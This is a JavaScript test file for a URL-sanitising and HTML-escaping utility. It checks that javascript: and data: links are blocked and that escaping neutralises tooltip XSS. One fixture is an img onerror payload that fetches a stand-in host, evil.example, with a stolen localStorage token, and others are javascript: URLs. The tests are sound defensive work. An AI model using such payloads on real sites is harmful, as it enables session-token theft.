/**
 * Run: node tests/safeExternalUrl.test.js
 */
import assert from "node:assert/strict";
import {
  escapeHtml,
  resolveSafeBtnHref,
  safeHttpUrl,
  safeTelUrl,
} from "../src/utils/logistica/safeExternalUrl.js";

let passed = 0;
function ok(name) {
  passed += 1;
  console.log(`  ✓ ${name}`);
}

console.log("safeExternalUrl");

assert.equal(safeHttpUrl("https://maps.google.com/?q=1"), "https://maps.google.com/?q=1");
assert.equal(safeHttpUrl("javascript:alert(1)"), null);
assert.equal(safeHttpUrl("data:text/html,x"), null);
assert.ok(safeTelUrl("+59899111222")?.startsWith("tel:"));
assert.equal(safeTelUrl("123"), null);
ok("blocks dangerous schemes");

{
  // Regression: list/stop Btn href must reject javascript: (Bug AJ residual after #886 drawer-only).
  assert.equal(resolveSafeBtnHref("javascript:alert(document.domain)"), null);
  assert.equal(resolveSafeBtnHref("JAVASCRIPT:alert(1)"), null);
  assert.equal(
    resolveSafeBtnHref("https://drive.google.com/file/d/abc/view"),
    "https://drive.google.com/file/d/abc/view",
  );
  assert.equal(resolveSafeBtnHref(""), null);
  assert.equal(resolveSafeBtnHref(null), null);
  ok("Btn href gate blocks javascript:");
}

{
  // Leaflet historically set tooltip strings via innerHTML; escapeHtml is the
  // string-sink backstop (map path uses textContent DOM nodes).
  assert.equal(
    escapeHtml(`<img src=x onerror="fetch('https://evil.example/?t='+localStorage.bmc_cockpit_token)">`),
    `&lt;img src=x onerror=&quot;fetch(&#39;https://evil.example/?t=&#39;+localStorage.bmc_cockpit_token)&quot;&gt;`,
  );
  assert.equal(escapeHtml("Cliente & Hijos"), "Cliente &amp; Hijos");
  assert.equal(escapeHtml(null), "");
  ok("escapeHtml neutralizes tooltip XSS payloads");
}

console.log(`safeExternalUrl: ${passed} passed`);
